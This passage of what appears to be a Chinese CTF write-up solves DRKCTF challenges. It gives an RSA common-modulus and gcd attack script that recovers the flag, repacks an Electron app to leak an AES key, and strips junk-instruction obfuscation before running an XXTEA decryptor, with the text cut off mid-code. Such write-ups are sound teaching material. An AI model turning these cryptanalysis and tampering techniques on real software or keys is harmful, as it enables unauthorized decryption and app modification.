class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> Crypto.Util.number <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">from</span> secret <span class="keyword">import</span> flag</span><br><span class="line"><span class="keyword">import</span> random</span><br><span class="line"><span class="keyword">import</span> gmpy2</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">generate_Key1</span>(<span class="params">ebits</span>):</span><br><span class="line">    e = [getPrime(ebits) <span class="keyword">for</span> _ <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">4</span>)]</span><br><span class="line">    <span class="keyword">return</span> e</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">encrypt1</span>(<span class="params">message,e</span>):</span><br><span class="line">    n = gmpy2.next_prime(bytes_to_long(message) &lt;&lt; <span class="number">300</span>)</span><br><span class="line">    m = getPrime(<span class="number">256</span>)</span><br><span class="line">    c = [<span class="built_in">int</span>(<span class="built_in">pow</span>(m,e[i],n)) <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="built_in">len</span>(e))]</span><br><span class="line">    <span class="keyword">return</span> c</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">generate_Key2</span>(<span class="params">nbits</span>):</span><br><span class="line">    p = getPrime(nbits // <span class="number">2</span>)</span><br><span class="line">    q = getPrime(nbits // <span class="number">2</span>)</span><br><span class="line">    n = p*q</span><br><span class="line">    e = [random.getrandbits(nbits // <span class="number">4</span>) <span class="keyword">for</span> _ <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">3</span>)]</span><br><span class="line">    <span class="keyword">return</span> n,e</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">encrypt2</span>(<span class="params">message,e,n</span>):</span><br><span class="line">    m = bytes_to_long(message)</span><br><span class="line">    c = [<span class="built_in">int</span>(<span class="built_in">pow</span>(m,e[i],n)) <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="built_in">len</span>(e))]</span><br><span class="line">    <span class="keyword">return</span> c</span><br><span class="line">    </span><br><span class="line"><span class="keyword">assert</span> flag.startswith(<span class="string">b&quot;DRKCTF&#123;&quot;</span>)</span><br><span class="line"></span><br><span class="line">flag1 = flag[:<span class="built_in">len</span>(flag)//<span class="number">2</span>]</span><br><span class="line">flag2 = flag[<span class="built_in">len</span>(flag)//<span class="number">2</span>:]</span><br><span class="line"></span><br><span class="line">ebits = <span class="number">7</span></span><br><span class="line">e1 = generate_Key1(ebits)</span><br><span class="line">cipher1 = encrypt1(flag1,e1)</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;e1 =&quot;</span>,e1)</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;cipher1 =&quot;</span>,cipher1)</span><br><span class="line"></span><br><span class="line">nbits = <span class="number">1024</span></span><br><span class="line">n,e2 = generate_Key2(nbits)</span><br><span class="line">cipher2 = encrypt2(flag2,e2,n)</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;e2 =&quot;</span>,e2)</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;cipher2 =&quot;</span>,cipher2)</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;n =&quot;</span>,n)</span><br><span class="line"></span><br><span class="line"><span class="string">&quot;&quot;&quot;</span></span><br><span class="line"><span class="string">e1 = [109, 71, 109, 73]</span></span><br><span class="line"><span class="string">cipher1 = [36272047346364825234770733058042613197790911431212158822254782055957208837848605160852567043492625692783344073921185227328379941291979083011033, 13421582077901767047291741873622169312010984740586925881415103229648835151589774736786336965745532072099996467445790339749720696886313635920080, 36272047346364825234770733058042613197790911431212158822254782055957208837848605160852567043492625692783344073921185227328379941291979083011033, 41425183140413487232780768389488969603566343428250573532166425276868000949579663990819005141199597640625439816343697426958648927294289659127871]</span></span><br><span class="line"><span class="string">e2 = [79572758141493570128961125255246129069540961757778793209698370333142346488381, 80555585862127636800866563977080055603517001358195529410497461746213789997225, 44651921320695090688745333790065512192118202496468714141526113242887125432380]</span></span><br><span class="line"><span class="string">cipher2 = [58600444300331800249882073146233995912287198739549440714207984476331259754331716531491187240053630185776787152600165426285021284302994699108557023545574315706006132536588848833818758624067461985444940651823107522770906474037882323326792755635934081822967331031854184791299228513024491344725765476710816941057, 16511944800191885973496391252612222059697387587833308714567450121364756390806094606646424594583975159634952911600665271092389815248477961923357683297311169260578508157717777465241680062644118354471550223231057620392252324514411927096940875466794869671163453991620492008856178108060167556176019729800517994337, 80885008609388989196377721090246742575908473911131498982960117640742106565184297197238656375198284856442596226398287448931285735903463892735111244609358611618958293002176923706195402338331128766464276441210238388187625107435781170368017908610916585774514676482124401329575553658828115269495158818527164441546]</span></span><br><span class="line"><span class="string">n = 93468142044831350317940409833603031534515663349871776634867176846669780024082517910566484997161088199091160371537367121403194814422867749777235397168852158723228851090445429617275680206703935781244466363279841409768649097588586494453125840436600639420286950914680651600232197982546122764845043227394567787283</span></span><br><span class="line"><span class="string">&quot;&quot;&quot;</span></span><br></pre></td></tr></table></figure><p>第一部分</p>这里有两个c，知道n是m<<300，只要找到模数n，就找到了m，构造$c_i=m^{e_i} \mod n$改写成${c_i}^{e_j}={{m^{e_i}}^{e_j}} ={c_j}^{e_i}\mod n$<p>这样两数之差就是kn，再来一个kn，求gcd即可</p><p>第二部分</p><p>这里重看一下共模攻击和CRT：</p><p><a href="https://www.cnblogs.com/ailanxier/p/13370753.html">中国剩余定理(CRT)及其扩展(EXCRT)详解 - ailanxier - 博客园 (cnblogs.com)</a></p><p>这里要想到三个e对应三个方程，不能简单当成gcd(e1,e2,e3)</p><p>把它当成两次共模攻击</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># from prism import *</span></span><br><span class="line"><span class="comment"># from math import *</span></span><br><span class="line"><span class="keyword">from</span> Crypto.Util.number <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">from</span> gmpy2 <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">e1 = [<span class="number">109</span>, <span class="number">71</span>, <span class="number">109</span>, <span class="number">73</span>]</span><br><span class="line">cipher1 = [<span class="number">36272047346364825234770733058042613197790911431212158822254782055957208837848605160852567043492625692783344073921185227328379941291979083011033</span>, <span class="number">13421582077901767047291741873622169312010984740586925881415103229648835151589774736786336965745532072099996467445790339749720696886313635920080</span>, <span class="number">36272047346364825234770733058042613197790911431212158822254782055957208837848605160852567043492625692783344073921185227328379941291979083011033</span>, <span class="number">41425183140413487232780768389488969603566343428250573532166425276868000949579663990819005141199597640625439816343697426958648927294289659127871</span>]</span><br><span class="line"></span><br><span class="line">d1 = cipher1[<span class="number">0</span>]**e1[<span class="number">1</span>] - cipher1[<span class="number">1</span>]**e1[<span class="number">0</span>]</span><br><span class="line">d2 = cipher1[<span class="number">2</span>]**e1[<span class="number">3</span>] - cipher1[<span class="number">3</span>]**e1[<span class="number">2</span>]</span><br><span class="line"></span><br><span class="line">n = gcd(d1,d2)</span><br><span class="line"></span><br><span class="line">m1 = n&gt;&gt;<span class="number">300</span></span><br><span class="line"><span class="comment"># print(long_to_bytes(m1))</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">e2 = [<span class="number">79572758141493570128961125255246129069540961757778793209698370333142346488381</span>, <span class="number">80555585862127636800866563977080055603517001358195529410497461746213789997225</span>, <span class="number">44651921320695090688745333790065512192118202496468714141526113242887125432380</span>]</span><br><span class="line">c2 = [<span class="number">58600444300331800249882073146233995912287198739549440714207984476331259754331716531491187240053630185776787152600165426285021284302994699108557023545574315706006132536588848833818758624067461985444940651823107522770906474037882323326792755635934081822967331031854184791299228513024491344725765476710816941057</span>, <span class="number">16511944800191885973496391252612222059697387587833308714567450121364756390806094606646424594583975159634952911600665271092389815248477961923357683297311169260578508157717777465241680062644118354471550223231057620392252324514411927096940875466794869671163453991620492008856178108060167556176019729800517994337</span>, <span class="number">80885008609388989196377721090246742575908473911131498982960117640742106565184297197238656375198284856442596226398287448931285735903463892735111244609358611618958293002176923706195402338331128766464276441210238388187625107435781170368017908610916585774514676482124401329575553658828115269495158818527164441546</span>]</span><br><span class="line">n = <span class="number">93468142044831350317940409833603031534515663349871776634867176846669780024082517910566484997161088199091160371537367121403194814422867749777235397168852158723228851090445429617275680206703935781244466363279841409768649097588586494453125840436600639420286950914680651600232197982546122764845043227394567787283</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">egcd</span>(<span class="params">a, b</span>):</span><br><span class="line">  <span class="keyword">if</span> a == <span class="number">0</span>:</span><br><span class="line">    <span class="keyword">return</span> (b, <span class="number">0</span>, <span class="number">1</span>)</span><br><span class="line">  <span class="keyword">else</span>:</span><br><span class="line">    g, y, x = egcd(b % a, a)</span><br><span class="line">    <span class="keyword">return</span> (g, x - (b // a) * y, y)</span><br><span class="line"><span class="keyword">def</span> <span class="title function_">modinv</span>(<span class="params">a, m</span>):</span><br><span class="line">  g, x, y = egcd(a, m)</span><br><span class="line">  <span class="keyword">if</span> g != <span class="number">1</span>:</span><br><span class="line">    <span class="keyword">raise</span> Exception(<span class="string">&#x27;modular inverse does not exist&#x27;</span>)</span><br><span class="line">  <span class="keyword">else</span>:</span><br><span class="line">    <span class="keyword">return</span> x % m</span><br><span class="line"></span><br><span class="line">_,s1, s2 = gmpy2.gcdext(e2[<span class="number">0</span>],e2[<span class="number">1</span>])</span><br><span class="line"><span class="comment"># print(s)</span></span><br><span class="line"><span class="keyword">if</span> s1&lt;<span class="number">0</span>:</span><br><span class="line">    s1 = - s1</span><br><span class="line">    c2[<span class="number">0</span>] = modinv(c2[<span class="number">0</span>], n)</span><br><span class="line"><span class="keyword">elif</span> s2&lt;<span class="number">0</span>:</span><br><span class="line">    s2 = - s2</span><br><span class="line">    c2[<span class="number">1</span>] = modinv(c2[<span class="number">1</span>], n)</span><br><span class="line"><span class="comment"># print(t)</span></span><br><span class="line">m2 = <span class="built_in">pow</span>(c2[<span class="number">0</span>], s1, n) * <span class="built_in">pow</span>(c2[<span class="number">1</span>], s2, n) % n</span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span>(long_to_bytes(m1)+long_to_bytes(m2))</span><br><span class="line"><span class="comment">#b&#x27;DRKCTF&#123;5d0b96e8-e069-4378-82e7-120e4b761a0b&#125;&#x27;</span></span><br></pre></td></tr></table></figure><h2 id="REVERSE">REVERSE</h2><h3 id="elec-go">elec_go</h3><p>佬出的题，第一次见</p><p>根据</p><p><a href="https://www.52pojie.cn/thread-1847258-1-1.html">Electron编写的exe 逆向思路 - 『脱壳破解区』 - 吾爱破解 - LCG - LSG |安卓破解|病毒分析|www.52pojie.cn</a></p><figure class="highlight stata"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">npm install asar -<span class="keyword">g</span></span><br><span class="line"><span class="keyword">cd</span> apps</span><br><span class="line">asar extract <span class="keyword">app</span>.asar <span class="keyword">app</span> <span class="comment">//解压拿到源码</span></span><br><span class="line">asar pack <span class="keyword">app</span> <span class="keyword">app</span>.asar <span class="comment">//重新打包</span></span><br></pre></td></tr></table></figure><p>打开js源代码，有一个base64，解密之后发现是aes，但是不知道key，直接写一个</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">  dialog.<span class="title function_">showMessageBox</span>(&#123;</span><br><span class="line">    <span class="attr">message</span>: <span class="string">`k3y 的值是：<span class="subst">$&#123;k3y.toString()&#125;</span>`</span>,</span><br><span class="line">    <span class="attr">buttons</span>: [<span class="string">&#x27;OK&#x27;</span>]</span><br><span class="line">&#125;)</span><br></pre></td></tr></table></figure><p>重新打包，拿到key的值，在线解密</p><p><img src="https://s2.loli.net/2024/05/30/ugIApJS6XdPciaH.png" alt="image-20240530225931951"></p><h3 id="flower-tea">flower_tea</h3><p>在这里说一下出题思路吧QAQ</p><p>这个题本来是想考一下去花指令的，没想到有佬直接调出来了，tql</p><p>花指令基本都很萌新QAQ，对栈做操作或者call，ret。</p><p>想了一下，可能反调试比花出的还好一点。毕竟x64的和x86有一点不一样。</p><p>感觉还有可以改进的地方：</p><p>隐藏交叉引用-用多级指针来隐藏交叉引用<br>真tea中jmp修正为jz和jnz，这样能起到一些混淆的作用<br>防止附加调试-在scanf之后再次判断调试状态，修改hook</p><p>但是都不会QAQ，还是要好好学，下面抄的官方wp</p><p>观察main函数：<br>主函数的大概是这样。<br><img src="https://cdn.nlark.com/yuque/0/2024/png/33730407/1716733828856-dd977d3e-329b-4748-adea-648e1ca77d81.png#averageHue=%2320201f&amp;clientId=u9fbe6832-1fb1-4&amp;from=paste&amp;id=u4cff4822&amp;originHeight=843&amp;originWidth=1134&amp;originalType=url&amp;ratio=1&amp;rotation=0&amp;showTitle=false&amp;size=45021&amp;status=done&amp;style=none&amp;taskId=ucfe2b2a2-9d0a-4981-9d9d-5cd31dff461&amp;title=" alt="image.png"><br>如果要调试，要先把第一个函数nop掉（实际上并不用）<br>这里先看encode函数，点开后是爆红的，所以先解花指令<br><img src="https://cdn.nlark.com/yuque/0/2024/png/33730407/1716733828863-fffea6a3-e0ed-4f7f-bd78-ba319fdb93b0.png#averageHue=%23242120&amp;clientId=u9fbe6832-1fb1-4&amp;from=paste&amp;id=u640b1518&amp;originHeight=256&amp;originWidth=819&amp;originalType=url&amp;ratio=1&amp;rotation=0&amp;showTitle=false&amp;size=27837&amp;status=done&amp;style=none&amp;taskId=ub41b481a-0633-41c0-9641-9f79986b3f5&amp;title=" alt="image.png"><br>这个是一个简单的jmp花指令，把后面的jmp nop掉，然后可以看到第一部分。<br>这时最上面还是有标红<br>在汇编界面看看哪里还有花<br><img src="https://cdn.nlark.com/yuque/0/2024/png/33730407/1716733828840-9379adb2-bb79-47ec-8e66-6b0b6186244b.png#averageHue=%23211f1f&amp;clientId=u9fbe6832-1fb1-4&amp;from=paste&amp;id=uf2076b9a&amp;originHeight=447&amp;originWidth=1027&amp;originalType=url&amp;ratio=1&amp;rotation=0&amp;showTitle=false&amp;size=46966&amp;status=done&amp;style=none&amp;taskId=ue7e65699-3668-4960-a21a-b46ea68bd25&amp;title=" alt="image.png"><br>这里有一个奇怪的call：<br>逻辑是：call完之后把ret的值+0xC然后返回<br>把这一部分按u解除，在加0xC后的位置再反编译<br><img src="https://cdn.nlark.com/yuque/0/2024/png/33730407/1716733828855-22c55bc8-7fc2-4b83-8efb-7c1c9f6b986d.png#averageHue=%23222121&amp;clientId=u9fbe6832-1fb1-4&amp;from=paste&amp;id=u8a8a33d3&amp;originHeight=902&amp;originWidth=982&amp;originalType=url&amp;ratio=1&amp;rotation=0&amp;showTitle=false&amp;size=57530&amp;status=done&amp;style=none&amp;taskId=u0a4f5158-d428-47e8-be3d-870a551763d&amp;title=" alt="image.png"><br>所以ret之后就会到pop的位置<br>把中间这一段全部nop，然后把整个函数u，然后c，再浏览一下函数，中间有一个怪jmp，删掉<br><img src="https://cdn.nlark.com/yuque/0/2024/png/33730407/1716733828869-884a2f60-9285-4f64-90a8-423fd0e572e7.png#averageHue=%23383a2d&amp;clientId=u9fbe6832-1fb1-4&amp;from=paste&amp;id=u4183dfaa&amp;originHeight=914&amp;originWidth=1121&amp;originalType=url&amp;ratio=1&amp;rotation=0&amp;showTitle=false&amp;size=50453&amp;status=done&amp;style=none&amp;taskId=u23ab1c10-a1fa-4e75-af1b-62ab76f52ea&amp;title=" alt="image.png"><br>然后再p，得到解完花的函数</p><figure class="highlight smali"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br></pre></td><td class="code"><pre><span class="line">__int64 __fastcall encode(__int64 a1, __int64 a2)</span><br><span class="line">&#123;</span><br><span class="line">  __int64 v2; // rcx</span><br><span class="line"> <span class="built_in"> int </span>v3; // eax</span><br><span class="line">  bool v4; // zf</span><br><span class="line"> <span class="built_in"> int </span>v5; // eax</span><br><span class="line"> <span class="built_in"> int </span>v7; // [rsp+2Ch] [rbp-34h]</span><br><span class="line"> <span class="built_in"> int </span>v8; // [rsp+30h] [rbp-30h]</span><br><span class="line">  unsigned<span class="built_in"> int </span>i; // [rsp+34h] [rbp-2Ch]</span><br><span class="line">  unsigned<span class="built_in"> int </span>v10; // [rsp+38h] [rbp-28h]</span><br><span class="line">  unsigned<span class="built_in"> int </span>v11; // [rsp+3Ch] [rbp-24h]</span><br><span class="line">  unsigned<span class="built_in"> int </span>v12; // [rsp+40h] [rbp-20h]</span><br><span class="line"> <span class="built_in"> int </span>v13; // [rsp+44h] [rbp-1Ch]</span><br><span class="line">  _BYTE v15[12]; // [rsp+54h] [rbp-Ch]</span><br><span class="line"></span><br><span class="line">  *(_QWORD *)&amp;v15[4] = a1;</span><br><span class="line">  *(_DWORD *)v15 = 0x9E3779B9;</span><br><span class="line">  v8 = 9;</span><br><span class="line">  v10 = 0;</span><br><span class="line">  v11 = *(_DWORD *)(a1 + 56);</span><br><span class="line">  do</span><br><span class="line">  &#123;</span><br><span class="line">    v10 -= 0x61C88647;</span><br><span class="line">    v7 = (v10 &gt;&gt; 2) &amp; 3;</span><br><span class="line">    for ( i = 0; ; ++i )</span><br><span class="line">    &#123;</span><br><span class="line">      v2 = 14i64;</span><br><span class="line">     <span class="built_in"> if </span>( i &gt;= 0xE )</span><br><span class="line">        break;</span><br><span class="line">      v12 = *(_DWORD *)(*(_QWORD *)&amp;v15[4] + 4i64 * (i + 1));</span><br><span class="line">      v3 = *(_DWORD *)(*(_QWORD *)&amp;v15[4] + 4i64 * i)</span><br><span class="line">         + (((v11 ^ *(_DWORD *)(a2 + 4i64 * (v7 ^ i &amp; 3))) + (v12 ^ v10)) ^ (((16 * v11) ^ (v12 &gt;&gt; 3))</span><br><span class="line">                                                                           + ((4 * v12) ^ (v11 &gt;&gt; 5))));</span><br><span class="line">      *(_DWORD *)(*(_QWORD *)&amp;v15[4] + 4i64 * i) = v3;</span><br><span class="line">      v11 = v3;</span><br><span class="line">    &#125;</span><br><span class="line">    v4 = **(_QWORD **)&amp;v15[4] == 0xEi64;</span><br><span class="line">    **(_QWORD **)&amp;v15[4] ^= 0xEui64;</span><br><span class="line">   <span class="built_in"> if </span>( v4 )</span><br><span class="line">    &#123;</span><br><span class="line">      v2 = *(_QWORD *)v15;</span><br><span class="line">      **(_QWORD **)&amp;v15[4] += *(_QWORD *)v15;</span><br><span class="line">    &#125;</span><br><span class="line">    **(_QWORD **)&amp;v15[4] ^= v2;</span><br><span class="line">    v5 = *(_DWORD *)(*(_QWORD *)&amp;v15[4] + 56i64)</span><br><span class="line">       + (((v11 ^ *(_DWORD *)(a2 + 4i64 * (v7 ^ i &amp; 3))) + (**(_DWORD **)&amp;v15[4] ^ v10)) ^ (((16 * v11) ^ (**(_DWORD **)&amp;v15[4] &gt;&gt; 3))</span><br><span class="line">                                                                                          + ((4 * **(_DWORD **)&amp;v15[4]) ^ (v11 &gt;&gt; 5))));</span><br><span class="line">    *(_DWORD *)(*(_QWORD *)&amp;v15[4] + 56i64) = v5;</span><br><span class="line">    v11 = v5;</span><br><span class="line">    --v8;</span><br><span class="line">  &#125;</span><br><span class="line">  while ( v8 );</span><br><span class="line">  v13 = 60;</span><br><span class="line">  while ( v13 != 1 )</span><br><span class="line">  &#123;</span><br><span class="line">    --v13;</span><br><span class="line">   <span class="built_in"> if </span>( *(unsigned __int8 *)(*(_QWORD *)&amp;v15[4] + v13) != (byte_7FF7A5187000[v13 + 1] ^ 0x23) )</span><br><span class="line">     <span class="built_in"> return </span>0;</span><br><span class="line">  &#125;</span><br><span class="line"> <span class="built_in"> return </span>1;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>这个的特征很明显是xxtea，并且没有魔改，网上直接搜脚本<br>exp：(需要用clang)<br>(网上的脚本<a href="https://www.cnblogs.com/zpchcbd/p/15974293.html">https://www.cnblogs.com/zpchcbd/p/15974293.html</a>)</p><figure class="highlight x86asm"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br></pre></td><td class="code"><pre><span class="line">#include &lt;stdio<span class="number">.</span>h&gt;</span><br><span class="line">#include &lt;stdint<span class="number">.</span>h&gt;</span><br><span class="line">#define DELTA <span class="number">0x9e3779b9</span></span><br><span class="line">#define MX (((z&gt;&gt;<span class="number">5</span>^y&lt;&lt;<span class="number">2</span>) + (y&gt;&gt;<span class="number">3</span>^z&lt;&lt;<span class="number">4</span>)) ^ ((sum^y) + (key[(p&amp;<span class="number">3</span>)^e] ^ z)))</span><br><span class="line"></span><br><span class="line">void btea(uint32_t* v, <span class="keyword">int</span> n, uint32_t const key[<span class="number">4</span>])</span><br><span class="line">&#123;</span><br><span class="line">uint32_t y, z, sum<span class="comment">;</span></span><br><span class="line">unsigned p, rounds, e<span class="comment">;</span></span><br><span class="line">if (n &gt; <span class="number">1</span>)            /* Coding Part */</span><br><span class="line">&#123;</span><br><span class="line">rounds = <span class="number">6</span> + <span class="number">52</span> / n<span class="comment">;</span></span><br><span class="line">sum = <span class="number">0</span><span class="comment">;</span></span><br><span class="line">z = v[n - <span class="number">1</span>]<span class="comment">;</span></span><br><span class="line"><span class="built_in">do</span></span><br><span class="line">&#123;</span><br><span class="line">sum += DELTA<span class="comment">;</span></span><br><span class="line">e = (sum &gt;&gt; <span class="number">2</span>) &amp; <span class="number">3</span><span class="comment">;</span></span><br><span class="line">for (p = <span class="number">0</span><span class="comment">; p &lt; n - 1; p++)</span></span><br><span class="line">&#123;</span><br><span class="line">y = v[p + <span class="number">1</span>]<span class="comment">;</span></span><br><span class="line">z = v[p] += MX<span class="comment">;</span></span><br><span class="line">&#125;</span><br><span class="line">y = v[<span class="number">0</span>]<span class="comment">;</span></span><br><span class="line">z = v[n - <span class="number">1</span>] += MX<span class="comment">;</span></span><br><span class="line">&#125; while (--rounds)<span class="comment">;</span></span><br><span class="line">&#125;</span><br><span class="line">else if (n &lt; -<span class="number">1</span>)      /* Decoding Part */</span><br><span class="line">&#123;</span><br><span class="line">n = -n<span class="comment">;</span></span><br><span class="line">rounds = <span class="number">6</span> + <span class="number">52</span> / n<span class="comment">;</span></span><br><span class="line">sum = rounds * DELTA<span class="comment">;</span></span><br><span class="line">y = v[<span class="number">0</span>]<span class="comment">;</span></span><br><span class="line"><span class="built_in">do</span></span><br><span class="line">&#123;</span><br><span class="line">e = (sum &gt;&gt; <span class="number">2</span>) &amp; <span class="number">3</span><span class="comment">;</span></span><br><span class="line">for (p = n - <span class="number">1</span><span class="comment">; p &gt; 0; p--)</span></span><br><span class="line">&#123;</span><br><span class="line">z = v[p - <span class="number">1</span>]<span class="comment">;</span></span><br><span class="line">y = v[p] -= MX<span class="comment">;</span></span><br><span class="line">&#125;</span><br><span class="line">z = v[n - <span class="number">1</span>]<span class="comment">;</span></span><br><span class="line">y = v[<span class="number">0</span>] -= MX<span class="comment">;</span></span><br><span class="line">sum -= DELTA<span class="comment">;</span></span><br><span class="line">&#125; while (--rounds)<span class="comment">;</span></span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">int</span> main()</span><br><span class="line">&#123;</span><br><span class="line">unsigned char fakefalg[<span class="number">99</span>] = &#123; <span class="number">0xff</span>, <span class="number">0xef</span>, <span class="number">0x79</span>, <span class="number">0xbc</span>, <span class="number">0xda</span>, <span class="number">0x6c</span>, <span class="number">0xc9</span>,</span><br><span class="line"><span class="number">0xb1</span>, <span class="number">0x24</span>, <span class="number">0x90</span>, <span class="number">0x89</span>, <span class="number">0x5d</span>, <span class="number">0x99</span>,</span><br><span class="line"><span class="number">0x42</span>, <span class="number">0xe1</span>, <span class="number">0x15</span>, <span class="number">0xc1</span>, <span class="number">0x1b</span>, <span class="number">0x2a</span>,</span><br><span class="line"><span class="number">0x5a</span>, <span class="number">0x9f</span>, <span class="number">0x90</span>, <span class="number">0xe0</span>, <span class="number">0x5f</span>, <span class="number">0xe9</span>,</span><br><span class="line"><span class="number">0x74</span>, <span class="number">0x9d</span>, <span class="number">0x44</span>, <span class="number">0x0d</span>, <span class="number">0x56</span>, <span class="number">0xfd</span>,</span><br><span class="line"><span class="number">0x51</span>, <span class="number">0x7e</span>, <span class="number">0x34</span>, <span class="number">0x5a</span>, <span class="number">0xc5</span>, <span class="number">0x3a</span>,</span><br><span class="line"><span class="number">0x5e</span>, <span class="number">0x24</span>, <span class="number">0xbc</span>, <span class="number">0xe1</span>, <span class="number">0x40</span>, <span class="number">0x0d</span>,</span><br><span class="line"><span class="number">0x17</span>, <span class="number">0x68</span>, <span class="number">0xfc</span>, <span class="number">0xcc</span>, <span class="number">0x09</span>, <span class="number">0x5b</span>,</span><br><span class="line"><span class="number">0xff</span>, <span class="number">0xc9</span>, <span class="number">0x45</span>, <span class="number">0x19</span>, <span class="number">0xb6</span>, <span class="number">0xc9</span>,</span><br><span class="line"><span class="number">0x0a</span>, <span class="number">0x5e</span>, <span class="number">0xd9</span>, <span class="number">0x03</span>, <span class="number">0xb2</span>, <span class="number">0x48</span> &#125;<span class="comment">;</span></span><br><span class="line">for (<span class="keyword">int</span> i = <span class="number">0</span><span class="comment">; i &lt; 61; ++i) &#123;</span></span><br><span class="line">fakefalg[i] ^= <span class="number">0x23</span><span class="comment">;</span></span><br><span class="line">&#125;</span><br><span class="line">uint32_t key[<span class="number">4</span>] = &#123; <span class="number">0x1234</span>,<span class="number">0x2341</span>,<span 